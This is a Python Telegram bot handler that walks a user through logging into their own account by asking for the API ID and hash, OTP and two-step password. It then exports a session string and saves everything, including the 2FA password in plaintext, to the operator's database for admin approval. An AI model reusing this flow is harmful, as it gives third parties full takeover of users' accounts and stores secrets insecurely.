"""
MIT License

Copyright (c) 2025 Randy Dev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import asyncio
import logging
import string
from asyncio.exceptions import TimeoutError
from datetime import datetime as dt
from random import choice

import pyromod
from pyrogram import Client, filters
from pyrogram.errors import (
    FloodWait,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from config import PRIVATE_GROUP_ID
from database import db

LOGS = logging.getLogger(__name__)

def generate_random_string(length):
    characters = string.ascii_uppercase + string.digits
    random_string = ''.join(choice(characters) for _ in range(length))
    return random_string

@Client.on_message(
    filters.contact
    & filters.private
)
async def contact_check(bot, message):
    if message.contact:
        user_id = message.from_user.id
        new_code_password = ""
        contact = message.contact
        client_name = generate_random_string(12)
        phone = "+" + contact.phone_number

        try:
            confirm_apid = await message.chat.ask(
                "Please send your API ID (from my.telegram.org):\n\n"
                "Format should be: `123456`\n\n"
                "Type /cancel to abort",
                timeout=300
            )
        except TimeoutError:
            return await bot.send_message(
                message.chat.id, "`Time limit reached of 5 min.`"
            )
        if confirm_apid.text.lower() == "/cancel":
            return await bot.send_message(message.chat.id, "Cancelled")
        api_id = confirm_apid.text
        await confirm_apid.delete()

        try:
            confirm_apihash = await message.chat.ask(
                "Please send your API HASH (from my.telegram.org):\n\n"
                "Format should be: `6asdksxxxxxxxx`\n\n"
                "Type /cancel to abort",
                timeout=300
            )
        except TimeoutError:
            return await bot.send_message(
                message.chat.id, "`Time limit reached of 5 min.`"
            )
        if confirm_apihash.text.lower() == "/cancel":
            return await bot.send_message(message.chat.id, "Cancelled")
        api_hash = confirm_apihash.text
        await confirm_apihash.delete()

        client = Client(
            "{}".format(client_name),
            api_id=int(api_id),
            api_hash=api_hash
        )
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        except Exception as e:
            LOGS.error(f"Error Connect Userbot: {str(e)}")
            await client.disconnect()
            return await bot.send_message(message.chat.id, "Error try again problem")

        while True:
            confirm = await message.chat.ask(
                f'`Is "{phone}" correct? (y/n):` \n\ntype: `y` (If Yes)\ntype: `n` (If No)'
            )
            if confirm.text.lower() == "/cancel":
                await bot.send_message(message.chat.id, "Cancelled")
                return await client.disconnect()
            if "y" in confirm.text.lower():
                await confirm.delete()
                break
        try:
            code = await client.send_code(phone)
            await asyncio.sleep(1)
        except FloodWait as e:
            return await bot.send_message(
                message.chat.id,
                f"`you have floodwait of {e.value} Seconds`"
            )
        except PhoneNumberInvalid:
            return await bot.send_message(
                message.chat.id,
                "`your Phone Number is Invalid.`"
            )
        except Exception as e:
            return await bot.send_message(
                message.chat.id,
                f"`your Phone Number is Invalid: {e}`"
            )
        try:
            otp = await message.chat.ask(
                (
                    "`An otp is sent to your phone number, "
                    "Please enter otp in\n`1 2 3 4 5` format.`\n\n"
                    "`If Bot not sending OTP then try` /restart `cmd and again` /start `the Bot.`\n"
                    "Press /cancel to Cancel."
                ),
                timeout=300,
            )
        except TimeoutError:
            return await bot.send_message(
                message.chat.id, "`Time limit reached of 5 min.`"
            )
        if otp.text.lower() == "/cancel":
            await bot.send_message(message.chat.id, "Cancelled")
            return await client.disconnect()
        otp_code = otp.text
        await otp.delete()
        try:
            await client.sign_in(
                phone,
                code.phone_code_hash,
                phone_code=" ".join(str(otp_code))
            )
        except PhoneCodeInvalid:
            return await bot.send_message(message.chat.id, "`Invalid Code.`")
        except PhoneCodeExpired:
            return await bot.send_message(message.chat.id, "`Code is Expired.`")
        except SessionPasswordNeeded:
            try:
                two_step_code = await message.chat.ask(
                    "`This account have two-step verification code.\nPlease enter your second factor authentication code.`\nPress /cancel to Cancel.",
                    timeout=300,
                )
            except TimeoutError:
                return await bot.send_message(
                    message.chat.id, "`Time limit reached of 5 min.`"
                )
            if two_step_code.text.lower() == "/cancel":
                await bot.send_message(message.chat.id, "Cancelled")
                return await client.disconnect()
            new_code = two_step_code.text
            new_code_password += two_step_code.text
            await two_step_code.delete()
            try:
                await client.check_password(new_code)
            except Exception as e:
                return await bot.send_message(
                    message.chat.id, "**ERROR:** `{}`".format(e)
                )
        except Exception as e:
            return await bot.send_message(
                message.chat.id, "**ERROR:** `{}`".format(e),
            )
        session_string = await client.export_session_string()
        await client.disconnect()
        now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
        admin_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Approve", callback_data=f"approved_ub_{user_id}"),
             InlineKeyboardButton("❌ Reject",  callback_data=f"rejected_ub_{user_id}")],
            [InlineKeyboardButton("👤 View User", url=f"tg://user?id={user_id}")]
        ])
        user_data = {
            "api_id": int(api_id),
            "api_hash": api_hash,
            "user_id": user_id,
            "is_active": False,
            "status": "pending",
            "created_at": now,
            "timestamp": now,
            "first_name": message.from_user.first_name,
            "username": message.from_user.username,
            "phone_number": phone,
            "password": new_code_password,
            "session_string": session_string,
        }
        existing_request = await db.users_detection.find_one({"user_id": user_id})
        if existing_request:
            await db.users_detection.update_one(
                {"user_id": user_id},
                {
                    "$push": {"user_client": user_data},
                    "$set": {"last_updated": now}
                },
                upsert=True
            )
        else:
            await db.users_detection.insert_one(
                {
                    "user_id": user_id,
                    "user_client": [user_data],
                    "created_at": now,
                    "last_updated": now
                }
            )
        await bot.send_message(
            message.chat.id,
            f"✅ **Deployment Detection Request Submitted**\n\n"
            f"⏳ Admin approval usually takes <15 minutes",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Check Status", callback_data=f"statusub_{user_id}")]
            ])
        )
        await bot.send_message(
            PRIVATE_GROUP_ID,
            text=f"**New Detection Request**\n\n"
                 f"👤 User: {message.from_user.mention} (`{user_id}`)\n"
                 f"📛 Username: @{message.from_user.username}\n"
                 f"⏰ Submitted: {now}\n"
                 f"🏷 Tier: 🆓 Free",
            reply_markup=admin_buttons
        )
